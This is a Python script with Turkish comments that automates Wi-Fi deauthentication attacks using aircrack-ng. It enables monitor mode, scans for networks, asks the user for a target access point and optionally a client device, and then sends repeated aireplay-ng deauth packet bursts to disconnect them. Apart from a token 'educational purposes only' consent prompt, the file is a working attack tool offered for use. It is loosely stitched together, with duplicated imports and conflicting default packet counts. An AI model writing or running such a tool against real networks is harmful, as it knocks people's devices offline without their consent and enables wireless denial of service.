import os
import subprocess
import time
import sys

# Kullanıcıdan onay alma
def get_user_consent():
    print("[!] WARNING & DISCLAIMER")
    print("This tool is for educational purposes only.")
    consent = input("Do you accept the terms and conditions? (yes/no): ").strip().lower()
    if consent != "yes":
        print("[-] Consent not given. Exiting...")
        sys.exit()

# WiFi adaptör kontrolü
def check_wifi_adapter():
    result = subprocess.run(["sudo", "iwconfig"], capture_output=True, text=True)
    if "wlan0" not in result.stdout:
        print("[-] No wireless adapter found!")
        sys.exit()

# Monitor modu başlatma
def start_monitor_mode():
    print("[*] Starting monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", "wlan0"])
    time.sleep(3)

# Ağları tarama
def scan_networks():
    print("[*] Scanning networks... Press Ctrl+C to stop.")
    subprocess.run(["sudo", "airodump-ng", "wlan0mon"])

# Kullanıcıdan hedef ağ seçimi
def select_target_network():
    target_mac = input("[?] Enter the target network MAC address: ").strip()
    return target_mac

# Kullanıcıdan kanal bilgisi alma
def get_target_channel():
    channel = input("[?] Enter the channel of the target network: ").strip()
    return channel

# Ağa bağlı cihazları tarama
def scan_connected_devices(target_mac, channel):
    print(f"[*] Scanning devices in {target_mac} on channel {channel}...")
    subprocess.run(["sudo", "airodump-ng", "--bssid", target_mac, "--channel", channel, "wlan0mon"])

# Kullanıcıdan hedef cihaz seçimi alma
def select_target_device(target_mac, channel):
    choice = input("[?] Do you want to target a specific device? (yes/no): ").strip().lower()
    if choice == "yes":
        scan_connected_devices(target_mac, channel)
        client_mac = input("[?] Enter the device MAC address: ").strip()
        return client_mac
    return None

# Paket sayısını belirleme
def select_deauth_packet_count():
    packet_count = input("[?] Enter the number of deauth packets: ").strip()
    if not packet_count.isdigit():
        print("[-] Invalid input, defaulting to 5 packets.")
        return "5"
    return packet_count

import subprocess
import os

def check_dependencies():
    """Gerekli araçların yüklü olup olmadığını kontrol eder."""
    try:
        subprocess.run(["aireplay-ng", "--version"], check=True, capture_output=True, text=True)
        return True
    except FileNotFoundError:
        print("[-] aireplay-ng bulunamadı. Lütfen aircrack-ng paketini kurun.")
        print("  (Örneğin, Debian/Ubuntu için: sudo apt install aircrack-ng)")
        return False

def start_deauth_attack(target_mac, client_mac, packet_count):
    # 1. Bağımlılıkları kontrol et
    if not check_dependencies():
        return  # Eğer bağımlılıklar yoksa, saldırıyı başlatma

    # 2. Paket sayısını doğrula
    if not str(packet_count).isdigit():
        print("[-] Geçersiz paket sayısı, varsayılan olarak 10 kullanılıyor.")
        packet_count = 10
    else:
        packet_count = int(packet_count)

    print(f"[*] Saldırı {packet_count} paket ile başlatılıyor...")

    # 3. Arayüzü belirle ve kontrol et
    interface = "wlan0mon"
    try:
        subprocess.run(["iwconfig", interface], check=True, capture_output=True, text=True)
        print(f"[+] {interface} arayüzü zaten mevcut.")
    except subprocess.CalledProcessError:
        print(f"[-] {interface} arayüzü bulunamadı, oluşturuluyor...")
        try:
            subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], check=True, capture_output=True, text=True)
            print(f"[+] {interface} başarıyla oluşturuldu.")
        except subprocess.CalledProcessError as e:
            print(f"[-] Arayüz oluşturulurken hata oluştu: {e}")
            return  # Arayüz oluşturulamazsa, fonksiyonu sonlandır

    # 4. Saldırı komutunu oluştur
    if client_mac:
        print(f"[*] {target_mac} ağındaki {client_mac} cihazına saldırılıyor...")
        command = ["sudo", "aireplay-ng", "--deauth", str(packet_count), "-a", target_mac, "-c", client_mac, "-i", interface, "--ignore-negative-one"]
    else:
        print(f"[*] {target_mac} ağının tamamına saldırılıyor (SSID odaklı)...")
        command = ["sudo", "aireplay-ng", "--deauth", str(packet_count), "-a", target_mac, "-i", interface, "--ignore-negative-one"]

    # 5. Saldırıyı başlat ve çıktıyı al
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print("[+] Saldırı başarıyla gerçekleştirildi!")
        print("[DEBUG] Komut Çıktısı:", result.stdout)
    except subprocess.CalledProcessError as e:
        print("[-] aireplay-ng çalıştırılırken hata oluştu! İzinleri veya bağımlılıkları kontrol edin.")
        print("[DEBUG] Komut Çıktısı:", e.stdout)
        print("[DEBUG] Komut Hatası:", e.stderr)



# Ana akış
def main():
    get_user_consent()
    check_wifi_adapter()
    start_monitor_mode()
    scan_networks()

    target_mac = select_target_network()
    channel = get_target_channel()
    client_mac = select_target_device(target_mac, channel)

    while True:
        packet_count = select_deauth_packet_count()
        start_deauth_attack(target_mac, client_mac, packet_count)

        repeat = input("[?] Would you like to perform another attack? (yes/no): ").strip().lower()
        if repeat != "yes":
            print("[+] Exiting...")
            sys.exit()

if __name__ == "__main__":
    main()